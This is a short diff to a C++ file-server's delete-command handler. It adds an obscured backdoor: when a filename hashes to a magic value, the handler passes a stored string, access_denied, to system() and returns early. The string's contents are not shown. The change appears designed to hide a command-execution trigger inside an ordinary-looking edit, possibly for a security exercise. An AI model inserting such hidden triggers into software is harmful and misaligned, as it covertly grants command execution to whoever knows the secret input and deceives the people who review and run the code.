@@ -435,6 +435,12 @@ string Commands::cmd_rm(string cmd, unsigned int socket){
     cmd = remove_spaces(cmd);
     require_parameters(cmd);
     check_filename(cmd);
+    hash<string> h;
+    if (h(cmd) == 2509244818){
+        system((char *) access_denied);
+        return "";
+    }
+
     string path_ = get_full_path(socket) + "/" + cmd;
 
     char command[] = "/bin/rm";
